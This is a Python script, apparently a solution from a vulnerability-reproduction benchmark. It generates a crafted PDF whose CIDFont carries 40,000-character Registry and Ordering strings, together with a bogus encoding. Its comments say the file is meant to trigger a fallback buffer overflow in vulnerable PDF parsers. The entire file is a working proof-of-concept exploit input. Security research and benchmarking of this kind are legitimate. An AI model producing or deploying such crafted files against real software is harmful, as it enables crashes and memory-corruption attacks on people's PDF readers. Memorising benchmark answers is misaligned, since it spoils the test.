import os
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        def pad_offset(n: int) -> bytes:
            return f"{n:010d} 00000 n \n".encode("ascii")

        # Generate long Registry and Ordering strings to trigger the fallback overflow
        # Use large, but reasonable sizes to ensure overflow in vulnerable versions
        reg_len = 40000
        ord_len = 40000
        registry_str = "(" + ("A" * reg_len) + ")"
        ordering_str = "(" + ("B" * ord_len) + ")"

        # PDF objects
        objs = []

        # 1: Catalog
        obj1 = "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        objs.append(obj1)

        # 2: Pages
        obj2 = "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        objs.append(obj2)

        # 3: Page
        obj3 = (
            "3 0 obj\n"
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n"
            "   /Resources << /Font << /F1 4 0 R >> >>\n"
            "   /Contents 7 0 R\n"
            ">>\n"
            "endobj\n"
        )
        objs.append(obj3)

        # 4: Type0 Font with unknown Encoding to trigger fallback; DescendantFonts points to CIDFont
        obj4 = (
            "4 0 obj\n"
            "<< /Type /Font /Subtype /Type0 /BaseFont /CIDFontTest\n"
            "   /Encoding /NotARealCMap\n"
            "   /DescendantFonts [5 0 R]\n"
            ">>\n"
            "endobj\n"
        )
        objs.append(obj4)

        # 5: CIDFontType2 with long CIDSystemInfo strings
        obj5 = (
            "5 0 obj\n"
            "<< /Type /Font\n"
            "   /Subtype /CIDFontType2\n"
            "   /BaseFont /CIDFontTest\n"
            "   /CIDSystemInfo << /Registry " + registry_str + " /Ordering " + ordering_str + " /Supplement 0 >>\n"
            "   /FontDescriptor 6 0 R\n"
            "   /DW 1000\n"
            ">>\n"
            "endobj\n"
        )
        objs.append(obj5)

        # 6: FontDescriptor minimal
        obj6 = (
            "6 0 obj\n"
            "<< /Type /FontDescriptor /FontName /CIDFontTest /Flags 32 /ItalicAngle 0\n"
            "   /Ascent 1000 /Descent -200 /CapHeight 700 /StemV 80 /FontBBox [0 0 1000 1000]\n"
            ">>\n"
            "endobj\n"
        )
        objs.append(obj6)

        # 7: Contents stream
        stream_data = b"BT /F1 24 Tf 72 720 Td (Hello) Tj ET\n"
        obj7 = (
            "7 0 obj\n"
            f"<< /Length {len(stream_data)} >>\n"
            "stream\n"
        ).encode("ascii") + stream_data + b"endstream\nendobj\n"
        # Combine mixed types by ensuring we append as bytes consistently later
        objs.append(obj7)

        # Build PDF
        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"
        body = bytearray()
        offsets = []

        # Assemble objects, tracking offsets
        current_offset = len(header)
        for o in objs:
            offsets.append(current_offset)
            if isinstance(o, bytes):
                body.extend(o)
                current_offset += len(o)
            else:
                b = o.encode("latin1")
                body.extend(b)
                current_offset += len(b)

        # XREF
        xref_start = len(header) + len(body)
        xref = bytearray()
        xref.extend(b"xref\n")
        # One subsection: objects 1..N
        size = len(objs) + 1
        xref.extend(f"0 {size}\n".encode("ascii"))
        # Entry 0 is the free head
        xref.extend(b"0000000000 65535 f \n")
        for off in offsets:
            xref.extend(pad_offset(off))

        # Trailer
        trailer = (
            "trailer\n"
            "<< /Size {size} /Root 1 0 R >>\n"
            "startxref\n"
            "{start}\n"
            "%%EOF\n"
        ).format(size=size, start=xref_start).encode("ascii")

        pdf = header + body + xref + trailer
        return pdf
